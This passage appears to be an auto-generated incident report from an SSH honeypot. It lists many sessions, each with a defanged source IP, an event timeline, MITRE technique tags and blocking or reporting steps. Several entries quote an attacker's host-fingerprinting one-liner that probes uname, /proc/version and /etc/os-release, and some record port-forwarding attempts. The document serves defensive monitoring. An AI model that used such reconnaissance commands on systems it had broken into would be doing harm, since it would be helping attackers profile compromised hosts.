| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.success` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.command.input` |
| `2026-08-15 20:02:25` | `cowrie.log.closed` |
| `2026-08-15 20:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48789f9ac3c0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:04 |
| **Last Seen** | 2026-08-15 20:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:04:12` | `cowrie.session.connect` |
| `2026-08-15 20:04:12` | `cowrie.client.version` |
| `2026-08-15 20:04:12` | `cowrie.client.kex` |
| `2026-08-15 20:04:15` | `cowrie.login.success` |
| `2026-08-15 20:04:17` | `cowrie.session.params` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.success` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:17` | `cowrie.command.input` |
| `2026-08-15 20:04:18` | `cowrie.log.closed` |
| `2026-08-15 20:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12476857d335

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-08-15 20:05 |
| **Last Seen** | 2026-08-15 20:10 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:05:53` | `cowrie.session.connect` |
| `2026-08-15 20:05:54` | `cowrie.client.version` |
| `2026-08-15 20:05:54` | `cowrie.client.kex` |
| `2026-08-15 20:05:55` | `cowrie.login.success` |
| `2026-08-15 20:05:56` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d671f972216e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:06 |
| **Last Seen** | 2026-08-15 20:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:06:06` | `cowrie.session.connect` |
| `2026-08-15 20:06:07` | `cowrie.client.version` |
| `2026-08-15 20:06:07` | `cowrie.client.kex` |
| `2026-08-15 20:06:10` | `cowrie.login.success` |
| `2026-08-15 20:06:12` | `cowrie.session.params` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.success` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:12` | `cowrie.command.input` |
| `2026-08-15 20:06:13` | `cowrie.log.closed` |
| `2026-08-15 20:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239e9b670274

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:07 |
| **Last Seen** | 2026-08-15 20:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:07:59` | `cowrie.session.connect` |
| `2026-08-15 20:07:59` | `cowrie.client.version` |
| `2026-08-15 20:07:59` | `cowrie.client.kex` |
| `2026-08-15 20:08:02` | `cowrie.login.success` |
| `2026-08-15 20:08:04` | `cowrie.session.params` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.success` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:04` | `cowrie.command.input` |
| `2026-08-15 20:08:05` | `cowrie.log.closed` |
| `2026-08-15 20:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a48d433bd3ee

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]201` |
| **First Seen** | 2026-08-15 20:08 |
| **Last Seen** | 2026-08-15 20:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:08:22` | `cowrie.session.connect` |
| `2026-08-15 20:08:22` | `cowrie.client.version` |
| `2026-08-15 20:08:22` | `cowrie.client.kex` |
| `2026-08-15 20:08:25` | `cowrie.login.success` |
| `2026-08-15 20:08:26` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]201` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-379fe61787bf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:09 |
| **Last Seen** | 2026-08-15 20:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:09:48` | `cowrie.session.connect` |
| `2026-08-15 20:09:49` | `cowrie.client.version` |
| `2026-08-15 20:09:49` | `cowrie.client.kex` |
| `2026-08-15 20:09:52` | `cowrie.login.success` |
| `2026-08-15 20:09:54` | `cowrie.session.params` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.success` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:54` | `cowrie.command.input` |
| `2026-08-15 20:09:55` | `cowrie.log.closed` |
| `2026-08-15 20:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543385f74ece

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-08-15 20:11 |
| **Last Seen** | 2026-08-15 20:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:11:06` | `cowrie.session.connect` |
| `2026-08-15 20:11:06` | `cowrie.client.version` |
| `2026-08-15 20:11:06` | `cowrie.client.kex` |
| `2026-08-15 20:11:09` | `cowrie.login.success` |
| `2026-08-15 20:11:09` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160772392177

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-15 20:11 |
| **Last Seen** | 2026-08-15 20:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:11:14` | `cowrie.session.connect` |
| `2026-08-15 20:11:15` | `cowrie.client.version` |
| `2026-08-15 20:11:15` | `cowrie.client.kex` |
| `2026-08-15 20:11:17` | `cowrie.login.success` |
| `2026-08-15 20:11:18` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f70c05b8322

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 20:11 |
| **Last Seen** | 2026-08-15 20:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:11:15` | `cowrie.session.connect` |
| `2026-08-15 20:11:15` | `cowrie.client.version` |
| `2026-08-15 20:11:15` | `cowrie.client.kex` |
| `2026-08-15 20:11:16` | `cowrie.login.success` |
| `2026-08-15 20:11:17` | `cowrie.session.params` |
| `2026-08-15 20:11:17` | `cowrie.command.input` |
| `2026-08-15 20:11:17` | `cowrie.log.closed` |
| `2026-08-15 20:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e7a30bd3c9b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:11 |
| **Last Seen** | 2026-08-15 20:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:11:34` | `cowrie.session.connect` |
| `2026-08-15 20:11:35` | `cowrie.client.version` |
| `2026-08-15 20:11:35` | `cowrie.client.kex` |
| `2026-08-15 20:11:38` | `cowrie.login.success` |
| `2026-08-15 20:11:40` | `cowrie.session.params` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.success` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:40` | `cowrie.command.input` |
| `2026-08-15 20:11:41` | `cowrie.log.closed` |
| `2026-08-15 20:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c13bde5e37

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:24` | `cowrie.session.connect` |
| `2026-08-15 20:12:24` | `cowrie.client.version` |
| `2026-08-15 20:12:24` | `cowrie.client.kex` |
| `2026-08-15 20:12:26` | `cowrie.login.success` |
| `2026-08-15 20:12:27` | `cowrie.session.params` |
| `2026-08-15 20:12:27` | `cowrie.command.input` |
| `2026-08-15 20:12:28` | `cowrie.log.closed` |
| `2026-08-15 20:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d189ffcbc8c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:30` | `cowrie.session.connect` |
| `2026-08-15 20:12:30` | `cowrie.client.version` |
| `2026-08-15 20:12:30` | `cowrie.client.kex` |
| `2026-08-15 20:12:32` | `cowrie.login.success` |
| `2026-08-15 20:12:33` | `cowrie.session.params` |
| `2026-08-15 20:12:33` | `cowrie.command.input` |
| `2026-08-15 20:12:34` | `cowrie.log.closed` |
| `2026-08-15 20:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb41683f02dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:35` | `cowrie.session.connect` |
| `2026-08-15 20:12:36` | `cowrie.client.version` |
| `2026-08-15 20:12:36` | `cowrie.client.kex` |
| `2026-08-15 20:12:37` | `cowrie.login.success` |
| `2026-08-15 20:12:38` | `cowrie.session.params` |
| `2026-08-15 20:12:38` | `cowrie.command.input` |
| `2026-08-15 20:12:39` | `cowrie.log.closed` |
| `2026-08-15 20:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b13da4e020c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:40` | `cowrie.session.connect` |
| `2026-08-15 20:12:40` | `cowrie.client.version` |
| `2026-08-15 20:12:40` | `cowrie.client.kex` |
| `2026-08-15 20:12:42` | `cowrie.login.success` |
| `2026-08-15 20:12:43` | `cowrie.session.params` |
| `2026-08-15 20:12:43` | `cowrie.command.input` |
| `2026-08-15 20:12:44` | `cowrie.log.closed` |
| `2026-08-15 20:12:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea91c5b24f1b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:46` | `cowrie.session.connect` |
| `2026-08-15 20:12:46` | `cowrie.client.version` |
| `2026-08-15 20:12:46` | `cowrie.client.kex` |
| `2026-08-15 20:12:46` | `cowrie.login.success` |
| `2026-08-15 20:12:47` | `cowrie.session.params` |
| `2026-08-15 20:12:47` | `cowrie.command.input` |
| `2026-08-15 20:12:47` | `cowrie.log.closed` |
| `2026-08-15 20:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418cf40f78cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:51` | `cowrie.session.connect` |
| `2026-08-15 20:12:51` | `cowrie.client.version` |
| `2026-08-15 20:12:51` | `cowrie.client.kex` |
| `2026-08-15 20:12:51` | `cowrie.login.success` |
| `2026-08-15 20:12:52` | `cowrie.session.params` |
| `2026-08-15 20:12:52` | `cowrie.command.input` |
| `2026-08-15 20:12:52` | `cowrie.log.closed` |
| `2026-08-15 20:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee7f72676e08

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:12 |
| **Last Seen** | 2026-08-15 20:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:12:56` | `cowrie.session.connect` |
| `2026-08-15 20:12:56` | `cowrie.client.version` |
| `2026-08-15 20:12:56` | `cowrie.client.kex` |
| `2026-08-15 20:12:57` | `cowrie.login.success` |
| `2026-08-15 20:12:58` | `cowrie.session.params` |
| `2026-08-15 20:12:58` | `cowrie.command.input` |
| `2026-08-15 20:12:58` | `cowrie.log.closed` |
| `2026-08-15 20:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4524fdcbd57

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:01` | `cowrie.session.connect` |
| `2026-08-15 20:13:01` | `cowrie.client.version` |
| `2026-08-15 20:13:02` | `cowrie.client.kex` |
| `2026-08-15 20:13:02` | `cowrie.login.success` |
| `2026-08-15 20:13:03` | `cowrie.session.params` |
| `2026-08-15 20:13:03` | `cowrie.command.input` |
| `2026-08-15 20:13:03` | `cowrie.log.closed` |
| `2026-08-15 20:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be98a4b24e67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:13:06` | `cowrie.session.connect` |
| `2026-08-15 20:13:06` | `cowrie.client.version` |
| `2026-08-15 20:13:07` | `cowrie.client.kex` |
| `2026-08-15 20:13:07` | `cowrie.login.success` |
| `2026-08-15 20:13:08` | `cowrie.session.params` |
| `2026-08-15 20:13:08` | `cowrie.command.input` |
| `2026-08-15 20:13:08` | `cowrie.log.closed` |
| `2026-08-15 20:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1a75d71090

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:13 |
| **Last Seen** | 2026-08-15 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

